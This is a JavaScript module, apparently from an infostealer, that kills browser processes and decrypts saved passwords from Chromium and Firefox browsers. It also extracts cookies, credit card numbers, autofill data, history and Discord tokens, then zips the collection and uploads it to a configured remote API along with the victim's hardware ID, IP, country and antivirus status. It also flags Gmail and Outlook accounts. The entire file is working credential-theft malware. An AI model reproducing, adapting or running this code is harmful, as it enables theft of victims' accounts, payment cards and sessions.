Object.defineProperty(exports, "__esModule", {
  value: true
});
const fs = require("fs");
const path = require("path");
const sqlite3 = require("sqlite3");
const koffi = require("koffi");
const {
  getMasterKey
} = require("../crypto/KeyDecryptor");
const {
  DataDecryptor
} = require("../crypto/DataDecryptor");
const {
  CONFIG
} = require("../config");
const {
  StorageService
} = require("./StorageService");
const {
  getNetworkInfo
} = require("../utils/NetworkInfo");
const {
  ApiSender
} = require("./ApiSender");
const {
  getHWID
} = require("../utils/GetHWID");
const {
  AntiVM
} = require("./AntiVM");
const {
  ZipService
} = require("./ZipService");
const {
  logger
} = require("../utils/Logger");
const SECItem = koffi.struct("SECItem", {
  type: "unsigned int",
  data: "void *",
  len: "unsigned int"
});
const SECItemPointer = koffi.pointer(SECItem);
class BrowserDataCollector {
  constructor() {
    this.stats = {
      passwords: 0,
      cookies: 0,
      history: 0,
      bookmarks: 0,
      autofill: 0,
      creditCards: 0,
      gmailAccounts: {},
      outlookAccounts: {},
      commonPasswords: {}
    };
    this.allPasswords = new Set();
    this.browsersPath = "";
    this.allCookiesPath = "";
    this.nss = null;
  }
  async initialize() {
    logger.step("BROWSER_COLLECTOR", "Initializing BrowserDataCollector...");
    StorageService.init(CONFIG.TMP_DIR);
    try {
      logger.info("Starting collection from all browsers...");
      const stats = await this.collectAll(CONFIG.USER_DATA, CONFIG.TMP_DIR);
      logger.info("Collection completed. Stats: Passwords=" + stats.passwords + ", Cookies=" + stats.cookies + ", CreditCards=" + stats.creditCards);
      const zipPath = path.join(CONFIG.TMP_DIR, "logs.zip");
      logger.info("Zipping collection data: " + CONFIG.TMP_DIR + " -> " + zipPath);
      await ZipService.zipCollection(CONFIG.TMP_DIR, zipPath);
      const hwid = getHWID();
      const sender = new ApiSender(CONFIG.ADMIN_ID, CONFIG.LICENSE_KEY, hwid, CONFIG.API_URL);
      const machine = AntiVM.getMachineDetails();
      if (!fs.existsSync(zipPath)) {
        logger.error("Zip file not found at " + zipPath);
        return;
      }
      const size = (fs.statSync(zipPath).size / 1048576).toFixed(2) + " MB";
      logger.info("Zip file size: " + size);
      logger.info("Fetching network info for reporting...");
      const network = await getNetworkInfo();
      logger.step("REPORTING", "Sending browser data report to API...");
      await sender.reportBrowserData({
        ...stats,
        username: machine.username || (machine.hostname ?? "Unkown"),
        ram: machine.ram,
        uptime: machine.uptime,
        size,
        ip: network.ip,
        country: network.country,
        antiVirus: AntiVM.detectAntiVirus() || "None"
      }, zipPath);
      logger.step("REPORTING", "Reporting identified Gmail/Outlook accounts...");
      await sender.reportPasswordData({
        username: machine.username || (machine.hostname ?? "Unknown"),
        gmailPasswords: stats.gmailAccounts,
        outlookPasswords: stats.outlookAccounts,
        passwords: stats.commonPasswords,
        ip: network.ip,
        country: network.country,
        hwid,
        admin: CONFIG.ADMIN_ID
      });
      logger.info("BrowserDataCollector initialization and reporting finished successfully.");
    } catch (error) {
      logger.error("Error in BrowserDataCollector.initialize:", error);
    }
  }
  async collectAll(browsers, tempDirectory) {
    this.browsersPath = path.join(tempDirectory, "browsers");
    this.allCookiesPath = path.join(tempDirectory, "allcookies");
    if (!fs.existsSync(this.allCookiesPath)) fs.mkdirSync(this.allCookiesPath, {
      recursive: true
    });
    for (const browser of Object.values(browsers)) {
      await this.terminateProcess(browser.process_name || browser.name);
      await new Promise(resolve => setTimeout(resolve, 250));
      if (!fs.existsSync(browser.user_data)) continue;
      const browserName = browser.name || "Unknown";
      const isFirefox = browserName.toLowerCase().includes("firefox");
      let masterKey = null;
      if (!isFirefox) {
        logger.info("Fetching master key for: " + browserName);
        const result = await getMasterKey(browser);
        logger.info("Master key result for " + browserName + ": " + (result ? "Found" : "Not Found"));
        if (result && result.key) masterKey = result.key;
      } else {
        logger.info("Setting up NSS for Firefox: " + browserName);
        this.setupNSS(browser.install_path || "C:\\Program Files\\Mozilla Firefox");
      }
      logger.info("Reading profiles for " + browserName + " from " + browser.user_data);
      let profiles;
      try {
        profiles = fs.readdirSync(browser.user_data).filter(name => {
          try {
            if (!fs.statSync(path.join(browser.user_data, name)).isDirectory()) return false;
            return isFirefox || name === "Default" || name.startsWith("Profile");
          } catch (error) {
            return false;
          }
        });
      } catch (error) {
        logger.error("Failed to read directory for " + browserName + ": " + browser.user_data, error);
        continue;
      }
      for (const profile of profiles) {
        logger.info("Processing profile: " + profile + " for " + browserName);
        const source = path.join(browser.user_data, profile);
        const destination = path.join(this.browsersPath, browserName, profile);
        try {
          if (!fs.existsSync(destination)) fs.mkdirSync(destination, {
            recursive: true
          });
        } catch (error) {
          logger.error("Failed to create save path: " + destination, error);
          continue;
        }
        if (isFirefox) {
          logger.info("Processing Firefox profile: " + profile);
          await this.processFirefoxProfile(source, tempDirectory, destination, browserName, profile);
        } else if (masterKey) {
          logger.info("Processing Chromium profile: " + profile);
          await this.processProfile(source, tempDirectory, masterKey, destination, browserName, profile);
        } else {
          logger.info("Skipping profile " + profile + " for " + browserName + " due to missing master key.");
        }
      }
    }
    try {
      if (this.allPasswords.size > 0) fs.writeFileSync(path.join(this.browsersPath, "..", "allpassword.txt"), Array.from(this.allPasswords).join("\n"));
    } catch (error) {
      logger.error("Failed to write allpassword.txt", error);
    }
    return this.stats;
  }
  async terminateProcess(processName) {
    return new Promise(resolve => {
      try {
        const executable = processName.toLowerCase().endsWith(".exe") ? processName : processName + ".exe";
        require("child_process").exec("taskkill /F /IM " + executable + " /T", {
          windowsHide: true
        }, (error, stdout, stderr) => {
          resolve();
        });
        setTimeout(() => resolve(), 1000);
      } catch (error) {
        resolve();
      }
    });
  }
  static async terminateAllProcesses() {
    const browsers = Object.values(CONFIG.USER_DATA);
    const pending = browsers.map(browser => new Promise(resolve => {
      try {
        const processName = browser.process_name || browser.name;
        const executable = processName.toLowerCase().endsWith(".exe") ? processName : processName + ".exe";
        require("child_process").exec("taskkill /F /IM " + executable + " /T", {
          windowsHide: true
        }, (error, stdout, stderr) => {
          resolve(null);
        });
        setTimeout(() => resolve(null), 1000);
      } catch (error) {
        resolve(null);
      }
    }));
    await Promise.all(pending);
  }
  setupNSS(installPath) {
    try {
      const libraryPath = path.join(installPath, "nss3.dll");
      if (!fs.existsSync(libraryPath)) {
        console.log("NSS DLL not found at " + libraryPath + ", skipping NSS setup.");
        return;
      }
      process.env.PATH = installPath + ";" + process.env.PATH;
      const library = koffi.load(libraryPath);
      this.nss = {
        NSS_Init: library.func("NSS_Init", "int", ["string"]),
        PK11SDR_Decrypt: library.func("PK11SDR_Decrypt", "int", [SECItemPointer, SECItemPointer, "void *"]),
        NSS_Shutdown: library.func("NSS_Shutdown", "int", []),
        SECITEM_FreeItem: library.func("SECITEM_FreeItem", "void", [SECItemPointer, "int"])
      };
    } catch (error) {
      console.error("Failed to set up NSS for Firefox decryption: " + error.message);
      this.nss = null;
    }
  }
  async processFirefoxProfile(profilePath, tempDirectory, destination, browserName, profileName) {
    const loginPath = path.join(profilePath, "logins.json");
    const keyPath = path.join(profilePath, "key4.db");
    if (fs.existsSync(loginPath) && fs.existsSync(keyPath) && this.nss) {
      const workDirectory = path.join(tempDirectory, "ff_work_" + Math.random().toString(36).slice(2));
      if (!fs.existsSync(workDirectory)) fs.mkdirSync(workDirectory, {
        recursive: true
      });
      try {
        try {
          for (const file of ["key4.db", "cert9.db", "pkcs11.txt"]) {
            const source = path.join(profilePath, file);
            if (fs.existsSync(source)) await this.copyWithRetry(source, path.join(workDirectory, file));
          }
          const nssPath = "sql:" + workDirectory.replace(new RegExp("\\\\", "g"), "/");
          const status = this.nss.NSS_Init(nssPath);
          const logins = JSON.parse(fs.readFileSync(loginPath, "utf8")).logins;
          if (status === 0) {
            let output = "";
            logger.info("Password entries found in Firefox profile " + profileName + ": " + logins.length);
            for (const login of logins) {
              logger.info("Processing login entry for " + login.hostname + " with username " + (login.encryptedUsername ? "exists" : "missing") + " and password " + (login.encryptedPassword ? "exists" : "missing"));
              const username = this.decryptFF(login.encryptedUsername);
              const password = this.decryptFF(login.encryptedPassword);
              if (username || password) {
                logger.info("Decrypted credentials for " + login.hostname + " - Username: " + (username ? "Decrypted" : "Empty") + " | Password: " + (password ? "Decrypted" : "Empty"));
                if (password) this.stats.commonPasswords[password] = (this.stats.commonPasswords[password] || 0) + 1;
                const host = String(login.hostname).toLowerCase();
                if (host.includes("accounts.google.com") || host.includes("mail.google.com") || host.includes("googlemail.com") || host.includes("gmail.com")) {
                  this.stats.gmailAccounts[username] = (this.stats.gmailAccounts[username] || 0) + 1;
                } else if (host.includes("outlook.com") || host.includes("hotmail.com") || host.includes("microsoft.com") || host.includes("live.com") || host.includes("office365.com")) {
                  this.stats.outlookAccounts[username] = (this.stats.outlookAccounts[username] || 0) + 1;
                }
                const line = "URL: " + login.hostname + " | USER: " + username + " | PASS: " + password;
                if (!this.allPasswords.has(line)) {
                  this.allPasswords.add(line);
                  output += line + "\n";
                  this.stats.passwords++;
                }
              } else {
                logger.warn("Failed to decrypt credentials for " + login.hostname + " in Firefox profile " + profileName);
              }
            }
            if (output) fs.writeFileSync(path.join(destination, "passwords.txt"), output);
            this.nss.NSS_Shutdown();
          } else {
            logger.error("Failed to initialize NSS for Firefox profile: " + profileName);
          }
        } catch (error) {
          logger.error("Error occurred while processing Firefox profile " + profileName + ": " + error.message);
        }
      } finally {
        try {
          fs.rmSync(workDirectory, {
            recursive: true,
            force: true
          });
        } catch (error) {}
      }
    }
    const targets = [{
      file: "cookies.sqlite",
      type: "ff_cookie",
      stat: "cookies",
      query: "SELECT host, name, path, value, expiry, isSecure FROM moz_cookies"
    }, {
      file: "places.sqlite",
      type: "ff_history",
      stat: "history",
      query: "SELECT url, title, visit_count FROM moz_places LIMIT 500"
    }, {
      file: "webappsstore.sqlite",
      type: "ff_discord",
      stat: "autofill",
      query: "SELECT key, value FROM webappsstore2 WHERE originKey LIKE '%discord%'"
    }, {
      file: "places.sqlite",
      type: "ff_bookmark",
      stat: "bookmarks",
      query: "SELECT b.title, p.url FROM moz_bookmarks b JOIN moz_places p ON b.fk = p.id WHERE b.type = 1"
    }];
    for (const target of targets) {
      const source = path.join(profilePath, target.file);
      if (fs.existsSync(source)) {
        const count = await this.decryptAndSave(source, "", tempDirectory, Buffer.alloc(0), destination, target.type, browserName, profileName, target.query);
        this.stats[target.stat] += count;
      }
    }
  }
  decryptFF(encrypted) {
    if (!encrypted) return "";
    let input = null;
    let output = null;
    try {
      try {
        const buffer = Buffer.from(encrypted, "base64");
        input = koffi.alloc("SECItem", 1);
        koffi.encode(input, "SECItem", {
          type: 0,
          data: buffer,
          len: buffer.length
        });
        output = koffi.alloc("SECItem", 1);
        koffi.encode(output, "SECItem", {
          type: 0,
          data: null,
          len: 0
        });
        if (this.nss.PK11SDR_Decrypt(input, output, null) === 0) {
          const result = koffi.decode(output, "SECItem");
          if (result.data && result.len > 0) {
            const bytes = koffi.decode(result.data, "uint8_t", result.len);
            const decrypted = Buffer.from(bytes).toString("utf8");
            this.nss.SECITEM_FreeItem(output, 0);
            return decrypted.replace(new RegExp("\\0", "g"), "");
          }
        }
      } catch (error) {
        logger.error("Error occurred while decrypting data: " + error.message);
      }
    } finally {
      if (input && typeof koffi.free === "function") koffi.free(input);
      if (output && typeof koffi.free === "function") koffi.free(output);
    }
    return "";
  }
  cleanUpTempFiles(databasePath) {
    ["", "-shm", "-wal"].forEach(suffix => {
      const file = databasePath + suffix;
      try {
        if (fs.existsSync(file)) fs.unlinkSync(file);
      } catch (error) {}
    });
  }
  async processProfile(profilePath, tempDirectory, masterKey, destination, browserName, profileName) {
    const targets = [{
      file: "Login Data",
      table: "logins",
      stat: "passwords",
      type: "password"
    }, {
      file: "Network/Cookies",
      table: "cookies",
      stat: "cookies",
      type: "cookie"
    }, {
      file: "Cookies",
      table: "cookies",
      stat: "cookies",
      type: "cookie"
    }, {
      file: "Web Data",
      table: "credit_cards",
      stat: "creditCards",
      type: "card"
    }, {
      file: "History",
      table: "urls",
      stat: "history",
      type: "history"
    }, {
      file: "Web Data",
      table: "autofill",
      stat: "autofill",
      type: "autofill"
    }, {
      file: "Bookmarks",
      stat: "bookmarks",
      isJson: true
    }];
    for (const target of targets) {
      const source = path.join(profilePath, target.file);
      if (fs.existsSync(source)) {
        logger.info("Processing target file: " + source + " (type: " + (target.type || "json") + ")");
        if (target.isJson) this.saveBookmarks(source, destination);else {
          const count = await this.decryptAndSave(source, target.table, tempDirectory, masterKey, destination, target.type, browserName, profileName);
          logger.info("Finished target file: " + source + ", count: " + count);
          this.stats[target.stat] += count;
        }
      }
    }
  }
  async decryptAndSave(source, table, tempDirectory, masterKey, destination, type, browserName, profileName, customQuery) {
    const tempPath = path.join(tempDirectory, "b_" + Math.random().toString(36).slice(2) + ".db");
    let count = 0;
    let output = "";
    try {
      logger.info("Copying DB to temp: " + source + " -> " + tempPath);
      await this.copyWithRetry(source, tempPath);
      return await new Promise(resolve => {
        const timer = setTimeout(() => {
          logger.error("Timeout reading sqlite DB: " + tempPath);
          resolve(0);
        }, 1000);
        logger.info("Opening sqlite DB: " + tempPath);
        const database = new sqlite3.Database(tempPath, sqlite3.OPEN_READONLY, error => {
          if (error) {
            logger.error("Error opening sqlite DB: " + tempPath, error);
            clearTimeout(timer);
            resolve(0);
          }
        });
        database.on("error", error => {
          logger.error("SQLite Error on " + tempPath + ":", error);
          clearTimeout(timer);
          resolve(0);
        });
        let query = customQuery;
        if (!query) {
          if (type === "password") query = "SELECT origin_url, username_value, password_value FROM logins";else if (type === "cookie") query = "SELECT host_key, name, path, encrypted_value, expires_utc, is_secure FROM cookies";else if (type === "card") query = "SELECT card_number_encrypted, name_on_card, expiration_month, expiration_year FROM credit_cards";else if (type === "history") query = "SELECT url, title, visit_count FROM urls";else if (type === "autofill") query = "SELECT name, value FROM autofill";else query = "";
        }
        if (!query) {
          database.close(() => {
            if (fs.existsSync(tempPath)) {
              try {
                fs.unlinkSync(tempPath);
                this.cleanUpTempFiles(tempPath);
              } catch (error) {}
            }
            clearTimeout(timer);
            resolve(0);
          });
          return;
        }
        database.all(query, (error, rows) => {
          clearTimeout(timer);
          try {
            if (!error && rows) {
              rows.forEach(row => {
                if (type === "ff_cookie") {
                  output += row.host + "\tTRUE\t" + row.path + "\t" + (row.isSecure ? "TRUE" : "FALSE") + "\t" + row.expiry + "\t" + row.name + "\t" + row.value + "\n";
                  count++;
                } else if (type === "ff_discord") {
                  const tokens = row.value.match(new RegExp("(mfa\\.[\\w-]{80,150}|[\\w-]{22,35}\\.[\\w-]{5,10}\\.[\\w-]{25,150})", "g"));
                  if (tokens) tokens.forEach(token => {
                    output += "Discord Token: " + token + "\n";
                    count++;
                  });
                } else if (type === "ff_history" || type === "history") {
                  output += "URL: " + row.url + " | Title: " + row.title + "\n";
                  count++;
                } else if (type === "ff_bookmark") {
                  output += "Title: " + row.title + " | URL: " + row.url + "\n";
                  count++;
                } else if (type === "cookie" && row.encrypted_value) {
                  const decrypted = DataDecryptor.decrypt(row.encrypted_value, masterKey);
                  if (decrypted) {
                    const value = decrypted.replace(new RegExp("[^\\x20-\\x7E]", "g"), "").trim();
                    const expiry = row.expires_utc > 0 ? Math.floor(row.expires_utc / 1000000) - 11644473600 : 0;
                    output += row.host_key + "\tTRUE\t" + row.path + "\t" + (row.is_secure === 1 ? "TRUE" : "FALSE") + "\t" + expiry + "\t" + row.name + "\t" + value + "\n";
                    count++;
                  }
                } else if (type === "password" && row.password_value) {
                  const password = DataDecryptor.decrypt(row.password_value, masterKey);
                  if (password && row.origin_url) {
                    this.stats.commonPasswords[password] = (this.stats.commonPasswords[password] || 0) + 1;
                    const host = String(row.origin_url).toLowerCase();
                    const username = row.username_value || "No User";
                    if (host.includes("accounts.google.com") || host.includes("mail.google.com") || host.includes("googlemail.com") || host.includes("gmail.com")) {
                      this.stats.gmailAccounts[password] = (this.stats.gmailAccounts[password] || 0) + 1;
                    } else if (host.includes("outlook.com") || host.includes("hotmail.com") || host.includes("microsoft.com") || host.includes("live.com") || host.includes("office365.com")) {
                      this.stats.outlookAccounts[password] = (this.stats.outlookAccounts[password] || 0) + 1;
                    }
                    const line = "URL: " + row.origin_url + " | USER: " + username + " | PASS: " + password;
                    if (!this.allPasswords.has(line)) {
                      this.allPasswords.add(line);
                      output += line + "\n";
                      count++;
                    }
                  }
                } else if (type === "card" && row.card_number_encrypted) {
                  const cardNumber = DataDecryptor.decrypt(row.card_number_encrypted, masterKey);
                  if (cardNumber) {
                    output += "No: " + cardNumber.replace(new RegExp("[^\\x20-\\x7E]", "g"), "") + " | Holder: " + row.name_on_card + " | Exp: " + row.expiration_month + "/" + row.expiration_year + "\n";
                    count++;
                  }
                } else if (type === "autofill") {
                  output += "Name: " + row.name + " | Value: " + row.value + "\n";
                  count++;
                }
              });
              if (output) {
                let fileName;
                if (type.startsWith("ff_")) fileName = type.split("_")[1] + ".txt";else if (type === "card") fileName = "credit_cards.txt";else fileName = type + ".txt";
                fs.writeFileSync(path.join(destination, fileName), output);
                if (type === "cookie" || type === "ff_cookie") {
                  const cookieName = (browserName + "_" + profileName + "_cookies.txt").replace(new RegExp("\\s+", "g"), "_");
                  if (!fs.existsSync(this.allCookiesPath)) fs.mkdirSync(this.allCookiesPath, {
                    recursive: true
                  });
                  const cookiePath = path.join(this.allCookiesPath, cookieName);
                  logger.info("Saving combined cookies to: " + cookiePath);
                  fs.writeFileSync(cookiePath, output);
                }
              }
            }
          } catch (error) {
            logger.error("Error processing rows for " + tempPath + ":", error);
          }
          database.close(() => {
            logger.info("Closed sqlite DB: " + tempPath);
            if (fs.existsSync(tempPath)) {
              try {
                fs.unlinkSync(tempPath);
                this.cleanUpTempFiles(tempPath);
              } catch (error) {}
            }
            resolve(count);
          });
        });
      });
    } catch (error) {
      logger.error("Outer error in decryptAndSave for " + source + ":", error);
      if (fs.existsSync(tempPath)) {
        try {
          fs.unlinkSync(tempPath);
        } catch (error) {}
      }
      return 0;
    }
  }
  saveBookmarks(source, destination) {
    try {
      const text = fs.readFileSync(source, "utf8");
      const bookmarks = JSON.parse(text);
      let output = "";
      let count = 0;
      const visit = entries => {
        entries.forEach(entry => {
          if (entry.url) {
            output += "Title: " + entry.name + " | URL: " + entry.url + "\n";
            count++;
          }
          if (entry.children) visit(entry.children);
        });
      };
      if (bookmarks.roots) Object.values(bookmarks.roots).forEach(root => root.children && visit(root.children));
      if (output) {
        fs.writeFileSync(path.join(destination, "bookmarks.txt"), output);
        this.stats.bookmarks += count;
      }
    } catch (error) {}
  }
  async copyWithRetry(source, destination, retries = 5) {
    for (let attempt = 0; attempt < retries; attempt++) {
      try {
        fs.copyFileSync(source, destination);
        return;
      } catch (error) {
        if ((error.code === "EBUSY" || error.code === "EPERM" || error.code === "EACCES") && attempt < retries - 1) {
          logger.warn("File locked (" + error.code + "), retrying copy for: " + source);
          await new Promise(resolve => setTimeout(resolve, 500));
        } else {
          throw error;
        }
      }
    }
  }
}
exports.BrowserDataCollector = BrowserDataCollector;
